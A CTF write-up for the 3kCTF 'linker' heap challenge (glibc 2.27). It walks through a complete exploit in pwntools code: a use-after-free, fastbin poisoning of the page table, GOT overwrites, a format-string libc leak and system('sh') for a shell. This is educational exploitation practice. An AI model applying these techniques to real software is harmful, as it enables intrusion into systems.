# Linker

This challenge was heap based pwn challenge with the given LIBC being 2.27.

### Overview

```r
❯ file linker
linker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d3da95d44b3a6fd21e32e74f782f1acb859e294d, not stripped
❯ checksec linker
[*] '/home/d4mianwayne/Pwning/CTFs/3kCTF/linker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

### Vulnerability

Use After Free in `edit_page` function, allowing us to tamper the metadata of a `free`'d chunk.

### Exploitation

The exploitation phase is about fastbin attack, we overwrite the chunk's `fd` pointer to point it before the `page` table which stores the pointer to the allocated hence, fully taking over the `page` array and overwrite the data as needed.

First, we fill the tcache bins since this challenge is on the GLIBC 2.27:-

```py
for i in range(7):
    add(0x60)
    empty(0)
```

Now, we allocate 3 chunks, named chunk A & chunk B and chunk C:-

```py
add(0x60) # chunk 0
add(0x60) # chunk 1
add(0x71) # chunk 2
empty(0)  # chunk 0 -> free'd -> 0x70
```

Now, the fastbin array looks like:-

```py
fastbins_array = [chunk[0]]
```
Now, we will overwrite the `fd` of the `chunk[0]` to point it before the `page` table:-

```py
edit(0,p64(0x6020C0)) # chunk[0]->fd = 0x6020c0 
add(0x60) # chunk 0
add(0x60) # chunk 3
```

Now, that being done, we will overwrite the pointers stored in the `page` table:-

```py
payload = p64(0xff)*2
payload += p64(0x0)*4
payload += p64(e.got['memcpy'])
payload += p64(e.got['atoi'])
'''
ptr[0] = memcpy@got
ptr[1] = atoi@got
'''
edit(3,payload)
```

Now, the `ptr[0]` is `memcpy@got` and the `ptr[1]` is `atoi@got`, such that when we call `edit` again and will be able to overwrite the GOT as needed. Firstly, we will overwrite the `memcpy@got` with the `prinf@plt` function to trigger the FSB to leak stack address, eventually a LIBC address to calculate the base address:-

> As for re-login, we stored the data the string `%15$p` on the very first prompt asking for the name itself and then when the `memcpy@got` is made in re-login, it will trigger the FSB and the 

```py
edit(0,p64(e.plt['printf'])) # ptr[0] -> memcpy@got -> printf@plt -> FSB
re() # relogin to trigger memcpy
p.sendafter('name:\n','\n') 
libc.address = int(p.recvuntil('W')[:-1],16) - libc.symbols['__libc_start_main'] - 231 # FSB -> %15$p -> __libc_start_main + 231
log.info(f"libc.address:  {hex(libc.address)}")
```

Now, having the LIBC address and the `ptr[1]` pointing to the `atoi@got`, we can just overwrite it with the system address and then on the next call of the `got` just pass the string `sh`, we will be prompted with the shell:-

```py
edit(1,p64(libc.symbols['system'])) # ptr[1] -> atoi@got -> system@libc
p.sendline('sh\x00')  # aoi("sh") -> system("sh")
p.interactive()
```

With that, we will have the shell :D